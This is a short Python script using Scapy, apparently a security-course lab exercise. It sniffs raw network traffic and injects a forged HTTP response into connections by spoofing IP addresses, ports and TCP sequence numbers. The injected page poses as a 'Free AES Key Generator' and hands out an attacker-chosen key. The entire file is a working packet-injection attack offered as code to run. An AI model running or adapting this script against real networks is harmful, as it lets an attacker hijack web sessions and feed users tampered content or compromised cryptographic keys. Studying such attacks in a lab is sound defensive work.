#!/usr/bin/python3

from scapy.all import send, conf, L3RawSocket
from scapy.all import TCP,IP,Ether,Raw
import socket

# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket=L3RawSocket
    send(pkt)

###
# edit this function to do your attack
###
def handle_pkt(pkt):
    # Convert received packets into Scapy packets
    scapy_pkt = Ether(pkt)
    # Find GET request packet
    if scapy_pkt.haslayer(Raw):
    	if b'GET' in scapy_pkt[Raw].load and b'4d6167696320576f7264733a2053717565616d697368204f7373696672616765' not in scapy_pkt[Raw].load:
    	    # scapy_pkt.show()
    	    # print('------------------ NEW PACKET -------------------')
    	    # Create new packet with malicious HTML in the Raw layer
    	    new_pkt = IP()/TCP()/b'HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nDate: Fri, 29 Oct 2021 17:45:03 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'
    	    # Set attributes of packet layers such that it mimics
    	    # the correct packet received after a GET request
    	    new_pkt[IP].dst = scapy_pkt[IP].src
    	    new_pkt[IP].src = scapy_pkt[IP].dst
    	    new_pkt[TCP].sport = scapy_pkt[TCP].dport
    	    new_pkt[TCP].dport = scapy_pkt[TCP].sport
    	    new_pkt[TCP].flags = 'PA'
    	    new_pkt[TCP].seq = scapy_pkt[TCP].ack
    	    new_pkt[TCP].ack = scapy_pkt[TCP].seq + 117
    	    # new_pkt.show()
    	    inject_pkt(new_pkt)

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__=='__main__':
    main()
